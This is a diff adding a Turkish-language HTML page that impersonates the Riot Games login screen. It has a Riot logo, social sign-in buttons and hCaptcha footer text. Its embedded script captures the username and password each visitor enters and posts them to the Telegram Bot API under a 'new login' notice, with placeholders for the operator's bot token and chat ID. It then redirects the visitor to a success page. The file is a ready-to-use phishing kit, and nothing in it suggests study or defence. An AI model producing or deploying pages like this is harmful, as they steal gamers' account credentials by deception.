@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Riot Games hesabınıza giriş yapın">
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="shortcut icon" type="image/png" href="favicon.png">
+    <title>GİRİŞ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Arka plan */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)),
+                url('bannerpc.PNG');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: 0;
+        }
+
+        /* Logo */
+        .top-logo {
+            position: absolute;
+            top: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            text-align: center;
+        }
+
+        .top-logo img {
+            height: 50px;
+            width: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Main content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 100px 20px 80px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .login-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 520px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+            padding: 55px 50px 50px;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: #292929;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            color: #5c5c6c;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px 16px;
+            border: none;
+            background: #e0e3ea;
+            font-size: 14px;
+            color: #292929;
+            font-family: inherit;
+            transition: background 0.2s;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            background: #d5d8e1;
+        }
+
+        /* Social login */
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 24px 0;
+        }
+
+        .social-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+        }
+
+        .social-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        }
+
+        .social-btn svg {
+            width: 24px;
+            height: 24px;
+            display: block;
+        }
+
+        .social-btn.facebook {
+            background: #1877f2;
+        }
+
+        .social-btn.google {
+            background: white;
+            border: 1px solid #e0e0e0;
+        }
+
+        .social-btn.google svg {
+            width: 22px;
+            height: 22px;
+        }
+
+        .social-btn.apple {
+            background: #000;
+        }
+
+        .social-btn.xbox {
+            background: #107c10;
+        }
+
+        .social-btn.playstation {
+            background: #003087;
+        }
+
+        /* Remember me */
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 30px;
+        }
+
+        .remember-me input {
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+
+        .remember-me label {
+            margin: 0;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+            text-transform: none;
+            letter-spacing: 0;
+            color: #292929;
+        }
+
+        /* Login button - KIRMIZI */
+        .submit-wrapper {
+            display: flex;
+            justify-content: center;
+            margin: 35px 0;
+        }
+
+        .login-button {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            background: #eb0029;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 42px;
+            color: white;
+            box-shadow: 0 4px 16px rgba(235, 0, 41, 0.3);
+        }
+
+        .login-button:hover {
+            background: #d4002a;
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(235, 0, 41, 0.4);
+        }
+
+        .login-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Links */
+        .links {
+            text-align: center;
+            margin-top: 28px;
+        }
+
+        .links a {
+            color: #292929;
+            text-decoration: none;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            line-height: 1.6;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            position: relative;
+            z-index: 10;
+            padding: 25px 20px 30px;
+            text-align: center;
+        }
+
+        .footer-top {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.85);
+            text-decoration: none;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #ffffff;
+        }
+
+        .language-selector {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.85);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+        }
+
+        .language-selector svg {
+            width: 12px;
+            height: 12px;
+            fill: rgba(255, 255, 255, 0.85);
+        }
+
+        .language-selector:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.4);
+            color: #ffffff;
+        }
+
+        .language-selector:hover svg {
+            fill: #ffffff;
+        }
+
+        .footer-text {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 18px;
+            line-height: 1.6;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .footer-text a {
+            color: rgba(255, 255, 255, 0.85);
+            text-decoration: underline;
+            transition: color 0.2s;
+        }
+
+        .footer-text a:hover {
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .top-logo {
+                top: 25px;
+            }
+
+            .top-logo img {
+                height: 42px;
+            }
+
+            .main-content {
+                padding: 80px 15px 60px;
+            }
+
+            .login-container {
+                max-width: 450px;
+                padding: 45px 40px 40px;
+            }
+
+            .title {
+                font-size: 22px;
+                margin-bottom: 26px;
+            }
+
+            .social-btn {
+                width: 56px;
+                height: 56px;
+            }
+
+            .social-btn svg {
+                width: 24px;
+                height: 24px;
+            }
+
+            .login-button {
+                width: 100px;
+                height: 100px;
+                font-size: 40px;
+            }
+
+            .footer-top {
+                gap: 15px;
+            }
+
+            .footer-links {
+                gap: 15px;
+            }
+
+            .footer-links a {
+                font-size: 10px;
+            }
+
+            .language-selector {
+                font-size: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .top-logo {
+                top: 20px;
+            }
+
+            .top-logo img {
+                height: 38px;
+            }
+
+            .login-container {
+                padding: 35px 25px 30px;
+            }
+
+            .title {
+                font-size: 20px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                font-size: 16px;
+            }
+
+            .social-login {
+                gap: 8px;
+            }
+
+            .social-btn {
+                width: 48px;
+                height: 48px;
+            }
+
+            .social-btn svg {
+                width: 20px;
+                height: 20px;
+            }
+
+            .login-button {
+                width: 85px;
+                height: 85px;
+                font-size: 32px;
+            }
+
+            .footer-top {
+                gap: 12px;
+            }
+
+            .footer-links {
+                gap: 12px;
+            }
+
+            .footer-links a {
+                font-size: 9px;
+            }
+
+            .language-selector {
+                font-size: 9px;
+                padding: 3px 8px;
+            }
+
+            .footer-text {
+                font-size: 9px;
+                margin-top: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo ortada -->
+    <div class="top-logo">
+        <img src="ccc.png" alt="Riot Games">
+    </div>
+
+    <!-- Ana içerik -->
+    <div class="main-content">
+        <div class="login-container">
+            <h1 class="title">Giriş</h1>
+
+            <form id="loginForm" novalidate>
+                <div class="form-group">
+                    <label for="username">Kullanıcı Adı</label>
+                    <input type="text" id="username" name="username" autocomplete="username" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Şifre</label>
+                    <input type="password" id="password" name="password" autocomplete="current-password" required>
+                </div>
+
+                <div class="social-login">
+                    <button type="button" class="social-btn facebook" aria-label="Facebook ile giriş">
+                        <svg viewBox="0 0 24 24" fill="white">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                    </button>
+                    <button type="button" class="social-btn google" aria-label="Google ile giriş">
+                        <svg viewBox="0 0 24 24">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                        </svg>
+                    </button>
+                    <button type="button" class="social-btn apple" aria-label="Apple ile giriş">
+                        <svg viewBox="0 0 24 24" fill="white">
+                            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                        </svg>
+                    </button>
+                    <button type="button" class="social-btn xbox" aria-label="Xbox ile giriş">
+                        <svg viewBox="0 0 24 24" fill="white">
+                            <path d="M4.102 21.033C5.555 22.438 7.437 23.456 9.566 23.88c.414-1.518 1.281-3.908 2.433-5.904-2.081-1.415-3.61-2.918-3.897-3.195-.285-.276-1.304-1.204-1.304-1.204s-3.266 4.168-2.696 7.456zM3.654 8.676c.063-.063.126-.125.189-.188 1.122-1.121 2.959-1.806 4.801-1.806 1.76 0 3.447.613 4.551 1.649-.933.692-1.904 1.546-2.845 2.497-1.557-.881-2.991-1.668-4.175-2.339-.631-.358-1.879-.998-2.521-.813zm7.89 1.722c-1.563 1.571-3.044 3.537-3.985 5.532.893 1.075 2.05 2.355 3.458 3.632 1.408-1.277 2.564-2.557 3.458-3.632-.942-1.995-2.422-3.961-3.985-5.532h.054zM20.346 8.676c-.642-.185-1.89.455-2.521.813-1.184.671-2.618 1.458-4.175 2.339-.941-.951-1.912-1.805-2.845-2.497 1.104-1.036 2.791-1.649 4.551-1.649 1.842 0 3.679.685 4.801 1.806.063.063.126.125.189.188zm-3.504 12.404c2.129-.424 4.011-1.442 5.464-2.847.57-3.288-2.696-7.456-2.696-7.456s-1.019.928-1.304 1.204c-.287.277-1.816 1.78-3.897 3.195 1.152 1.996 2.019 4.386 2.433 5.904z"/>
+                        </svg>
+                    </button>
+                    <button type="button" class="social-btn playstation" aria-label="PlayStation ile giriş">
+                        <svg viewBox="0 0 24 24" fill="white">
+                            <path d="M8.985 2.596v17.548l3.915 1.261V6.688c0-.69.304-1.151.794-.991.636.181.794.821.794 1.511v8.454c1.284.433 2.619.768 3.915 1.261V8.777c0-2.52-1.433-3.963-3.915-3.963-1.284 0-2.619.434-3.915 1.261V2.596H8.985zm-6.318 14.82c-.794.242-1.284.82-1.284 1.511 0 .69.49 1.027 1.284.821l4.276-1.511V15.76l-4.276 1.656zm17.347-.967c.794-.242 1.284-.82 1.284-1.511 0-.69-.49-1.027-1.284-.821l-4.276 1.511v2.477l4.276-1.656z"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Oturumu açık tut</label>
+                </div>
+
+                <div class="submit-wrapper">
+                    <button type="submit" class="login-button">
+                        <span>→</span>
+                    </button>
+                </div>
+            </form>
+
+            <div class="links">
+                <a href="#">Oturum açamıyor musun?<br>Hesap oluştur</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-top">
+            <div class="footer-links">
+                <a href="#">DESTEK</a>
+                <a href="#">GİZLİLİK POLİTİKASI</a>
+                <a href="#">HİZMET ŞARTLARI</a>
+                <a href="#">ÇEREZ TERCİHLERİ</a>
+            </div>
+            <button class="language-selector">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+                </svg>
+                EN
+            </button>
+        </div>
+        <div class="footer-text">
+            BU SİTE HCAPTCHA İLE KORUNUR VE ONUN <a href="#">GİZLİLİK POLİTİKASI</a> VE <a href="#">HİZMET ŞARTLARI</a> GEÇERLİDİR.
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Ayarları (buraya kendi bilgilerinizi girin)
+        const TELEGRAM_BOT_TOKEN = 'BURAYA_BOT_TOKEN_YAZIN';
+        const TELEGRAM_CHAT_ID = 'BURAYA_CHAT_ID_YAZIN';
+
+        // Form submission handler
+        const loginForm = document.getElementById('loginForm');
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            
+            if (!username || !password) {
+                alert('Lütfen kullanıcı adı ve şifre alanlarını doldurun.');
+                return;
+            }
+            
+            // Telegram'a bildirim gönder
+            sendToTelegram(username, password, remember);
+            
+            // Log form data (for development)
+            console.log('Kullanıcı adı:', username);
+            console.log('Şifre:', password);
+            console.log('Beni hatırla:', remember);
+            
+            // 1 saniye bekle ve başarı sayfasına yönlendir
+            setTimeout(() => {
+                window.location.href = 'success.html';
+            }, 1000);
+        });
+
+        // Telegram'a mesaj gönderme fonksiyonu
+        function sendToTelegram(username, password, remember) {
+            const message = `
+🎮 YENİ GİRİŞ BİLDİRİMİ 🎮
+
+👤 Kullanıcı Adı: ${username}
+🔒 Şifre: ${password}
+💾 Beni Hatırla: ${remember ? 'Evet' : 'Hayır'}
+
+🕐 Tarih: ${new Date().toLocaleString('tr-TR')}
+🌐 IP: ${window.location.hostname}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const data = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            // Telegram API'ye POST isteği gönder
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Telegram bildirimi gönderildi!');
+                } else {
+                    console.error('Telegram hatası:', data);
+                }
+            })
+            .catch(error => {
+                console.error('Telegram gönderim hatası:', error);
+            });
+        }
+
+        // Social login button handlers
+        const socialButtons = document.querySelectorAll('.social-btn');
+        
+        socialButtons.forEach(btn => {
+            btn.addEventListener('click', function() {
+                const platform = this.classList[1];
+                console.log('Sosyal giriş:', platform);
+                alert(`${platform.charAt(0).toUpperCase() + platform.slice(1)} ile giriş yapılıyor...`);
+            });
+        });
+    </script>
+</body>
+</html>
